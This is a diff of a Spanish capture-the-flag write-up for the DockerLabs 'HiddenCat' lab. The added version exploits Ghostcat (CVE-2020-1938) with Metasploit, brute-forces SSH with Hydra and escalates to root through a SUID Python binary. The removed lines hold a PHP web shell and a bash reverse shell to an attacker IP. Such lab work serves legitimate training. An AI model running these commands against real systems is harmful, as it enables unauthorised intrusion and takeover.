@@ -7,18 +7,18 @@ header-style: text
 catalog: true
 tags:
   -  DockerLabs
-  -  Web Fuzzing
+  -  Fuerza Bruta
   -  Binarios UNIX
-  -  Arbitrary File Upload
+  -  Metasploit
   -  Reverse Shell
 ---
 
 #### **Información**
 - **Máquina:** HiddenCat
-- **Plataforma:**[DockerLabs](https://dockerlabs.es/)
+- **Plataforma:** [DockerLabs](https://dockerlabs.es/)
 - **Creador:** El Pingüino de Mario
 - **SO:** Linux
-- **Dificultad:** Easy
+- **Dificultad:** `Facil`{:.success}
 
 #### **Configuración Entorno**
 Primeramente, como siempre para configurar las máquinas de DockerLabs, exportamos los ficheros auto_deploy.sh y en este caso hiddencat.tar.
@@ -58,105 +58,80 @@ nmap -p- --open -sV -sC -sS --min-rate=5000 -vvv -n -Pn -oN scan
 
 Vemos que tiene abiertos los puertos **22 (SSH), 8080 y 8009**.
 Gracias a los scrips de nmap nos detecta lo siguiente:
--	Puerto 22: `OpenSSH 7.9p1`{:.succes}
+-	Puerto 22: `OpenSSH 7.9p1`{:.error}
 -	Puerto 8009: `Apache Jserv (Protocol v1.3)`{:.error}
 -	Puerto 8080: `Apache Tomcat 9.0.30`{:.error}
 
-Descartamos de momento atacar al puerto 22 ya que cuenta con una versión de OpenSSH no vulnerable, por tanto, investigamos el puerto 8009 que corre un Apache Jserv. Encontramos la siguiente referencia al respecto en **HackTriks** https://book.hacktricks.xyz/v/es/network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp, donde se detalla que versiones anteriores a 9.0.31, 8.5.51 y 7.0.100 de Apache Tomcat, si el puerto AJP está expuesto -como es el caso aquí, dado que tenemos la versión 9.0.30 y el puerto 8009 expuesto-, presentan una vulnerabilidad conocida como "Ghostcat" (CVE-2020-1938).
+Descartamos de momento atacar al puerto 22 ya que cuenta con una versión de OpenSSH no vulnerable, por tanto, investigamos el puerto 8009 que corre un Apache Jserv. Encontramos la siguiente referencia al respecto en [HackTriks](https://book.hacktricks.xyz/v/es/network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp), donde se detalla que versiones anteriores a 9.0.31, 8.5.51 y 7.0.100 de Apache Tomcat, si el puerto AJP está expuesto -como es el caso aquí, dado que tenemos la versión 9.0.30 y el puerto 8009 expuesto-, presentan una vulnerabilidad conocida como `Ghostcat`{:.info} (CVE-2020-1938).
 
+En el propio HackTik encontramos un script en Python que permite explotar esta vulnerabilidad, yo he preferido buscarlo en `Metasploit`{:.info}.
+
+Arrancamos Metasploit con el comando `msfconsole`{:.info}.
+Una vez dentro buscamos los exploits que hagan referencia a Apache Jserv
 ```bash
-nmap -p- --open -sV -sC -sS --min-rate=5000 -vvv -n -Pn -oN scan
+msf6 > search exploit Apache Jserv
 ```
-- **-p-** --> Busqueda de puertos abiertos
-- **--open** --> Enumera los puertos abiertos
-- **-sS** --> Es un modo de escaneo rapido
-- **-sC** --> Que use un conjunto de scripts de reconocimiento
-- **-sV** --> Que encuentre la version del servicio abirto
-- **--min-rate=5000** --> Hace que el reconocimiento aun vaya mas rapido mandando no menos de 5000 paquetes
-- **-n** --> No hace resolución DNS
-- **-Pn** --> No hace ping
-- **-vvv** --> Muestra en pantalla a medida que encuentra puertos (Verbose)
-
-![Image 4](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img.png)
-
-Podemos observar que solo cuenta con el puerto 80 abierto, al acceder via web nos encontramos con lo siguiente:
-![Image 5](https://aanton94.github.io/blog/img/Upload/Img5.png)
-
-Nos encontramos con un campo que nos permite subir un archivo, por lo tanto, tratamos de subir un fichero de prueba:
-![Image 6](https://aanton94.github.io/blog/img/Upload/Img6.png)
-
-Recibimos un mensaje de que el archivo se ha subido correctamente. A continuación, realizaremos fuzzing de la web para poder localizar posibles directorios. Utilizaremos la herramienta de fuzzing `gobuster`{:.info} aunque podríamos utilizar cualquier otra de este estilo, para ello utilizaremos un diccionario de directorios comunes.
-
+Encontramos el exploit `tomcat_ghostcat`{:.info}, lo seleccionamos.
 ```bash
-gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
+msf6 > use 0
 ```
-![Image 7](https://aanton94.github.io/blog/img/Upload/Img7.png)
-
-Al finalizar el fuzzing encontramos el directorio uploads, tratamos de acceder y podemos ver que en este directorio se almaceno el fichero que subimos anteriormente.
-![Image 8](https://aanton94.github.io/blog/img/Upload/Img8.png)
-
-Comprobamos que podemos abrir el fichero en el navegador.
-![Image 9](https://aanton94.github.io/blog/img/Upload/Img9.png)
-
-Por tanto, al tener una ruta donde podemos subir y abrir ficheros, intentaremos subir un fichero con codigo php malicioso para tratar de lograr ejecutar comandos de forma remota.
-
-#### **Explotación**
-
-Para la explotación vamos a crear un archivo php llamado cmd.php con el siguiente código:
-
-```php
-<?php
-	system($_GET['cmd']);
-?>
-```
-
-Este script PHP ejecuta un comando del sistema recibido a través de la variable GET llamada 'cmd'. Por lo tanto, puede ser una puerta de entrada para ejecutar comandos maliciosos si no se filtran adecuadamente las entradas del usuario.
-
-Subimos el fichero cmd.php, nos dirigimos al directorio uploads y vemos que al leer el fichero el servidor ejecuta el codigo php, utilizamos la variable cmd definida en el script para ejecurar el comando `whoami`{:.info}.
-![Image 10](https://aanton94.github.io/blog/img/Upload/Img10.png)
-
-Y efectivamente, nos devuelve que es usuario es **www-data**, por lo tanto, confirmamos que tenemos ejecución remota de comandos, abusando de esta brecha de seguridad podemos intentar abrir una revese shell contra el servidor víctima.
-
-Para ello pondremos nuestra maquina atacante en escucha por el puerto 4444 utilizando netcat:
-
+Y revisamos los parámetros necesarios para el exploit.
 ```bash
-nc -lvnp 4444
+msf6 > show options
 ```
-Y ejecutaremos una revese shell a través del script de php cmd.php subido anteriormente.
+![Image 5](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img5.png)
 
-`http://172.17.0.2/uploads/cmd.php?cmd=bash -c "bash -i >& /dev/tcp/192.168.199.131/4444 0>&1"`{:.info}
-
-Al ejecutarlo no nos funciona, por tanto, la volvemos a pasar, pero esta vez aplicando un URL Encode:
-
-`http://172.17.0.2/uploads/cmd.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.199.131%2F4444%200%3E%261%22`{:.info}
-
-Y recibimos la reverse shell en el puerto que teníamos en escucha.
-![Image 11](https://aanton94.github.io/blog/img/Upload/Img11.png)
-
-Una vez tenemos la revese shell es hora de realizar el tratamiento de la TTY, ya que nos facilitara el manejo al no matar la shell al ejecutar control+c, control+l, etc.
-
-Para ello ejecutamos los siguientes comandos:
-
+Establecemos la IP de la maquina víctima y ejecutamos el exploit.
 ```bash
-script /dev/null -c bash
-ctrl+z
-stty raw -echo; fg
-reset xterm
-export TERM=xterm
-export SHELL=bash
+msf6> set RHOST 172.17.0.2
+msf6> exploit
 ```
+![Image 6](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img6.png)
 
-Una vez realizado comenzaremos con la escalada de privilegios, lo primero que hacemos siempre es revisar que binarios puede ejecutar nuestro usuario como `root`{:.error}, para ello ejecutamos `sudo -l`{:.info}.
-![Image 12](https://aanton94.github.io/blog/img/Upload/Img12.png)
+Podemos ver que tenemos un usuario llamado Jerry.
+Teniendo el usuario podríamos tratar de aplicar fuerza bruta para lograr acceso por SSH a la maquina víctima, ya que como nos mostró el escaneo de nmap, contamos con el Puerto 22 abierto.
+Realizamos el ataque con Hydra al usuario Jerry utilizando el diccionario de contraseñas comunes `rockyou.txt`{:.info}.
+```bash
+hydra 172.17.0.2 ssh -s 22 -l jerry -P /usr/share/wordlists/rockyou.txt -f -I -t 64
+```
+![Image 7](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img7.png)
 
-Vemos que podemos ejecutar el binario `/usr/bin/env`{:.info} como usuario `root`{:.error}, sin necesidad de conocer su contraseña. Para explotarlo podemos utilizar la web [http://https://gtfobins.github.io/](http://https://gtfobins.github.io/) y buscar la forma de explotar dicho binario. En este caso simplemente tenemos que ejecutar `sudo env /bin/sh`{:.info}
-![Image 13](https://aanton94.github.io/blog/img/Upload/Img13.png)
+Y efectivamente nos encuentra la contraseña `chocolate`{:.success} :chocolate_bar: para el usuario Jerry
+Accedemos por SSH a la maquina víctima.
 
-Y efectivamente, somo `root`{:.error}, por lo tanto, `¡¡¡maquina vulnerada!!!`{:.success} :smirk::smirk::smirk:
+![Image 8](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img8.png)
+Una vez dentro trato de ejecutar sudo -l para listar los privilegios que tiene el usuario “Jerry” en el sistema mediante el comando sudo. Esto significa que muestra qué comandos puede ejecutar el usuario Jerry con privilegios elevados utilizando sudo, así como cualquier restricción aplicada a esos privilegios.
+Pero nos indica que sudo no está instalado en el sistema, por tanto, pruebo a buscar los archivos con permisos SUID en el sistema.
+```bash
+jerry@a8385f5ecbd3:~$ find / -perm -4000 2>/dev/null
+/bin/ping
+/bin/su
+/bin/umount
+/bin/mount
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/perl5.28.1
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/perl
+/usr/bin/chsh
+/usr/bin/python3.7
+/usr/bin/python3.7m
+```
+Consultamos [http://https://gtfobins.github.io/](http://https://gtfobins.github.io/) para encontrar una manera de elevar privilegios con Python. Luego, ejecutamos el siguiente comando:
+```bash
+/usr/bin/python3.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+![Image 9](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img9.png)
+
+Y efectivamente, ya somo `root`{:.error}, por lo tanto, `¡¡¡maquina vulnerada!!!`{:.success} :sunglasses::sunglasses::sunglasses:
 
 #### **Eliminación del entorno**
 
 Para borrar la máquina solo debemos ir a la consola donde lo desplegamos y presionar `ctrl+c`{:.info} y eliminaría y borraría todo rastro de la máquina víctima en nuestro sistema LINUX.
-![Image 14](https://aanton94.github.io/blog/img/Upload/Img14.png)
+
+![Image 10](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img10.png)
 
 `¡¡¡Espero que os haya gustado y nos vemos en la próxima!!!`{:.success}
